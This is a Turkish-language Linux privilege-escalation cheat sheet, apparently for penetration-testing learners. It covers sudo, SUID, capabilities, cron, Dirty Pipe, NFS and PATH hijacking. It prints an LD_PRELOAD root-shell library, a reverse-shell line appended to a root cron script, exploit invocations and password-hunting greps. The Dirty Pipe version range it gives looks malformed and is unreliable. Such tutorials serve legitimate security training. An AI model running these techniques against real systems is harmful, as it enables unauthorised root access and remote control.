# Linux Privilege Escalation (Yetki Yükseltme) Rehberi (2025)

## 📑 İçerik
- [Giriş](#-giriş)
- [Sudo Yetkileri (Sudo Rights)](#-sudo-yetkileri-sudo-rights)
- [SUID / SGID İstismarı](#-suid--sgid-istismarı)
- [Capabilities (Yetenekler)](#-capabilities-yetenekler)
- [Cron Job Kötüye Kullanımı](#-cron-job-kötüye-kullanımı)
- [Kernel Exploitleri (Dirty Pipe vb.)](#-kernel-exploitleri)
- [Zafiyetli Servisler](#-zafiyetli-servisler)
- [Otomasyon Araçları](#-otomasyon-araçları)
- [Bonus: Diğer Yöntemler](#-bonus-diğer-yöntemler)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş
Privilege Escalation (Yetki Yükseltme), bir sistemde düşük yetkili bir kullanıcıdan (örneğin `www-data` veya standart kullanıcı) `root` veya yönetici yetkilerine erişim sağlama sürecidir.
Bu rehber; yanlış yapılandırmalar, kernel zafiyetleri ve özel izinlerin kötüye kullanımı üzerine odaklanır.

---

## 🦅 Sudo Yetkileri (Sudo Rights)
Kullanıcının hangi komutları `root` yetkisiyle (şifresiz veya şifreli) çalıştırabileceğini kontrol etmek ilk adımdır.

### Kontrol Komutu
```bash
sudo -l
```

### LD_PRELOAD Tekniği
Eğer `sudo -l` çıktısında `env_keep+=LD_PRELOAD` ibaresini görüyorsan, paylaşılan bir kütüphane dosyası yükleyerek root olabilirsin.

**1. Zararlı C Kodu (escalate.c):**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

**2. Derleme ve Çalıştırma:**
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c
sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup
```

---

## 🔑 SUID / SGID İstismarı
SUID (Set User ID) bitine sahip dosyalar, dosya sahibinin (genellikle root) yetkileriyle çalışır.

### Tespit Komutları
| Amaç | Komut |
|------|-------|
| SUID Dosyaları Bul | `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` |
| SGID Dosyaları Bul | `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` |

### Örnek SUID Çıktısı
```text
-rwsr-xr-x 1 root root 35040 Jan 20 2022 /usr/bin/umount
-rwsr-xr-x 1 root root 71912 Jan 20 2022 /usr/bin/su
-rwsr-xr-x 1 root root 158448 Nov 2 2022 /usr/bin/ntfs-3g
```
> 💡 **İpucu:** Bulunan binary dosyaları [GTFOBins](https://gtfobins.github.io/) üzerinde aratarak nasıl exploit edileceğini (SUID bölümü) öğrenebilirsin.

---

## ⚡ Capabilities (Yetenekler)
Linux, root yetkilerini parçalara bölerek `capabilities` olarak dağıtır. SUID kullanılmasa bile bazı binary'ler tehlikeli yeteneklere sahip olabilir.

### Tespit Komutları
```bash
# Getcap aracının yerini bulma
whereis getcap

# Tüm sistemde recursive arama
/usr/sbin/getcap -r / 2>/dev/null
```

### Önemli Capability Değerleri
| Değer | Açıklama |
|-------|----------|
| `+ep` | **Effective & Permitted:** Programın yeteneği kullanmasına ve izin verilen işlemleri yapmasına olanak tanır. En tehlikeli kombinasyondur. |
| `+ei` | **Effective & Inheritable:** Alt süreçlere (child processes) yeteneğin aktarılmasını sağlar. |
| `+p` | **Permitted:** İzin verilen eylemleri yapar ama miras bırakmaz. |

### Kritik Yetenekler ve Riskleri
| Capability | Tanımı ve Risk |
|------------|----------------|
| `cap_setuid` | Sürecin **UID** değiştirmesine izin verir (Root olma yolu). |
| `cap_setgid` | Sürecin **GID** değiştirmesine izin verir. |
| `cap_sys_admin` | "Root gibi" davranma yeteneği (mount, sistem ayarları vb.). |
| `cap_dac_override` | Dosya okuma/yazma/çalıştırma izinlerini yok sayar (Her dosyayı okuyabilir). |

---

## 🕰️ Cron Job Kötüye Kullanımı
Sistemde zamanlanmış görevlerin (Cron) çalıştığı scriptlere yazma iznimiz varsa, root yetkisiyle kod çalıştırabiliriz.

### Tespit
```bash
cat /etc/crontab
ls -l /etc/cron.d/
```

### Exploit Senaryosu
Eğer root tarafından çalıştırılan bir script (`backup_log.sh`) herkes tarafından yazılabilirse (`w` yetkisi):

```bash
# Scriptin sonuna reverse shell ekle
echo "sh -i >& /dev/tcp/172.18.2.47/4444 0>&1" >> /usr/local/bin/backup_log.sh
```
_Cron zamanı geldiğinde belirtilen IP'ye root shell düşer._

---

## ☢️ Kernel Exploitleri
Kernel sürümü eskiyse veya bilinen zafiyetler varsa derlenmiş exploit kodları kullanılabilir.

### Bilgi Toplama
```bash
uname -a
cat /etc/issue
```

### Örnek: Dirty Pipe (CVE-2022-0847)
- **Etkilenen Sürümler:** Linux Kernel 5.8 ile 5.15.25.12 arası.
- **Link:** [DirtyPipe Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/)

**Kullanım Yöntemleri:**
1.  **Exploit-1:** `/etc/passwd` dosyasını manipüle ederek root şifresini değiştirir/kaldırır.
2.  **Exploit-2:** SUID binary'lerini manipüle ederek shell alır.

```bash
# SUID binary tespiti sonrası (örneğin /usr/bin/su)
./exploit-2 /usr/bin/su
```

---

## 🛠️ Zafiyetli Servisler
Sistemde root yetkisiyle çalışan ancak zafiyeti olan uygulamalar.

### Örnek: GNU Screen 4.5.0
Log dosyası izin kontrolü hatası nedeniyle yetki yükseltmeye izin verir.
```bash
screen -v
# Versiyon 4.5.0 ise exploit scriptini çalıştır.
```

---

## 🤖 Otomasyon Araçları
Manuel aramadan sonra sistemi hızlıca taramak için:

| Araç | Açıklama | Kaynak |
|------|----------|--------|
| **LinPEAS** | En kapsamlı PE scripti. Renkli çıktısı ile kritik açıkları gösterir. | [GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) |
| **LinEnum** | Daha sade, temel sistem bilgilerini ve izinleri döker. | [GitHub](https://github.com/rebootuser/LinEnum) |
| **GTFOBins** | Unix binary'lerini istismar etmek için başucu kaynağı. | [Web](https://gtfobins.github.io/) |

---

## 🎁 Bonus: Diğer Yöntemler

### 1. Dosya ve Şifre Avı (Password Hunting)
Geliştiriciler bazen şifreleri dosyalarda unutur.
```bash
# "password" kelimesini dosya içeriklerinde ara
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

# Geçmiş komutlara bak
history
cat ~/.bash_history
```

### 2. NFS Root Squashing
Eğer hedef makinede NFS paylaşımı varsa ve `no_root_squash` ayarı açıksa:
1. Kendi makinenizde mount edin.
2. Paylaşılan klasöre SUID bitine sahip bir `bash` kopyalayın.
3. Hedef makinede bu dosyayı çalıştırın.

```bash
# Hedef makinede /etc/exports kontrolü:
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

### 3. Path Hijacking
Eğer SUID bitine sahip bir program, içinde tam yol belirtmeden bir komut çalıştırıyorsa (örneğin `/bin/cat` yerine sadece `cat`), kendi zararlı dosyamızı araya sokabiliriz.

```bash
cd /tmp
echo "/bin/bash" > cat
chmod +x cat
export PATH=/tmp:$PATH
./hedef_suid_program
# Program "cat" çağırdığında bizim script çalışır -> Root Shell.
```

---

## 📚 Kaynaklar
- [GTFOBins](https://gtfobins.github.io/) - Binary Exploitation
- [HackTheBox - Linux Privilege Escalation](https://www.hackthebox.com)
- [PayloadsAllTheThings - Linux PE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
